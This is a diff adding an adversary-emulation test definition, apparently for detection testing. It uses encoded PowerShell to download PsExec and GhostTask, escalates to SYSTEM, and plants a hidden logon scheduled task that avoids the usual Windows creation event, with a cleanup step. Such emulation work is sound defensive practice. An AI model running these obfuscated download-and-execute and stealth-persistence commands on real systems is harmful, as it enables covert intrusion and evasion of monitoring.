@@ -1,0 +1,28 @@
+- id: d88eb517-a0ce-5e9a-be74-27efe372b0d2
+  name: Soumaia ART Tests - Scheduled Task ("Ghost Task") via Registry Key Manipulation
+  description: 'Create a scheduled task through manipulation of registry keys. This procedure is implemented using the [GhostTask](https://github.com/netero1010/GhostTask) utility. By manipulating registry keys under HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree, the tool creates user-specified scheduled tasks without a corresponding Windows Event 4698, which is logged when scheduled tasks are created through conventional means.
+
+    This requires a download of the GhostTask binary, which must be run as NT Authority\SYSTEM. Upon successful execution of this test, a scheduled task will be set to run at logon which launches notepad.exe or runs a user-specified command.
+
+    For further exploration of this procedure and guidance for hunting and detection, see [Hunting G-G-G-GhostTasks!](https://medium.com/p/154b50ab6a78). (requires elevation)'
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1053.005
+    name: 'Scheduled Task/Job: Scheduled Task'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABQAHMARQB4AGUAYwAuAGUAeABlACIAKQAgAHsAIABlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAIABlAHgAaQB0ACAAMQB9AAoA
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZABvAHcAbgBsAG8AYQBkAC4AcwB5AHMAaQBuAHQAZQByAG4AYQBsAHMALgBjAG8AbQAvAGYAaQBsAGUAcwAvAFAAUwBUAG8AbwBsAHMALgB6AGkAcAAiACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAFAAcwBUAG8AbwBsAHMALgB6AGkAcAAiAAoARQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAFAAcwBUAG8AbwBsAHMALgB6AGkAcAAiACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAFAAcwBUAG8AbwBsAHMAIgAgAC0ARgBvAHIAYwBlAAoAQwBvAHAAeQAtAEkAdABlAG0AIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAUABzAFQAbwBvAGwAcwBcAFAAcwBFAHgAZQBjAC4AZQB4AGUAIgAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABQAHMARQB4AGUAYwAuAGUAeABlACIAIAAtAEYAbwByAGMAZQAKAA==
+          )
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABHAGgAbwBzAHQAVABhAHMAawAuAGUAeABlACIAKQAgAHsAIABlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAIABlAHgAaQB0ACAAMQB9AAoA
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAG4AZQB0AGUAcgBvADEAMAAxADAALwBHAGgAbwBzAHQAVABhAHMAawAvAHIAZQBsAGUAYQBzAGUAcwAvAGQAbwB3AG4AbABvAGEAZAAvADEALgAwAC8ARwBoAG8AcwB0AFQAYQBzAGsALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAEcAaABvAHMAdABUAGEAcwBrAC4AZQB4AGUAIgAKAA==
+          )
+          "%TEMP%\ART-ExternalPayloads\PsExec.exe" \\localhost -accepteula -s "cmd.exe"
+          "%TEMP%\ART-ExternalPayloads\GhostTask.exe" \\localhost add lilghostie "cmd.exe" "/c notepad.exe" $env:USERDOMAIN + '\' + $env:USERNAME logon
+        cleanup: |-
+          "%TEMP%\ART-ExternalPayloads\PsExec.exe" \\localhost -accepteula -s "cmd.exe"
+          "%TEMP%\ART-ExternalPayloads\GhostTask.exe" \\localhost delete lilghostie > nul
